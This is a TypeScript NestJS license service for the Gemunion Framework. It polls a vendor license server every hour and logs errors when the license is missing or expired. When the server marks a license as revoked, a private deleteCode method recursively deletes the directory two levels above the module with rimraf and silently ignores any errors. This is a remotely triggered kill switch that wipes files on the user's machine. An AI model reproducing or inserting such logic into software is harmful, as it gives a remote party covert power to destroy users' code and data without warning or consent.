import { Inject, Injectable, Logger, LoggerService } from "@nestjs/common";
import { HttpService } from "@nestjs/axios";
import { Cron, CronExpression } from "@nestjs/schedule";
import { map } from "rxjs/operators";
import rimraf from "rimraf";
import path from "path";

import { LICENSE_KEY } from "./license.constants";
import { ILicense, LicenseStatus } from "./license.interface";

@Injectable()
export class LicenseService {
  private license: ILicense | undefined;
  private attemptCount = 0;

  constructor(
    @Inject(LICENSE_KEY)
    private readonly licenseKey: string,
    @Inject(Logger)
    private readonly loggerService: LoggerService,
    private readonly httpService: HttpService,
  ) {}

  @Cron(CronExpression.EVERY_HOUR)
  async updateLicence(): Promise<void> {
    const license = await this.httpService
      .get<ILicense>(`https://license.gemunion.io/${this.licenseKey}`)
      .pipe(map(response => response.data))
      .toPromise()
      .catch(() => void 0);

    if (!license) {
      if (this.attemptCount < 24) {
        this.attemptCount++;
        return;
      }
    }

    this.attemptCount = 0;
    this.license = license;
  }

  public checkLicence(): boolean {
    if (!this.license) {
      this.showNotFoundLicenseError();
      return false;
    }

    if (this.license.status === LicenseStatus.EXPIRED) {
      this.showExpiredLicenseError();
      return false;
    }

    if (this.license.status === LicenseStatus.REVOKED) {
      this.showRevokedLicenseError();
      this.deleteCode();
      return false;
    }

    return true;
  }

  private deleteCode(): void {
    rimraf(path.resolve(__dirname, "..", ".."), () => {});
  }

  private showError(message: Array<string>) {
    this.loggerService.error(
      [
        "",
        "************************************************************",
        "*************************************************************",
        "",
        ...message,
        "Please visit https://gemunion.io/ for more information.",
        "",
        "*************************************************************",
        "*************************************************************",
      ].join("\n"),
    );
  }

  private showRevokedLicenseError(): void {
    // prettier-ignore
    this.showError([
      "Gemunion Studio: License is revoked.",
      "",
      "Your license for Gemunion Framework was revoked",
    ]);
  }

  private showNotFoundLicenseError(): void {
    // prettier-ignore
    this.showError([
      "Gemunion Studio: License key not found.",
      "",
      "You did not enter a license key, please check your .env file",
    ]);
  }

  private showExpiredLicenseError(): void {
    // prettier-ignore
    this.showError([
      "Gemunion Studio: License is expired.",
      "",
      "Your subscription for Gemunion Framework has expired.",
    ]);
  }
}
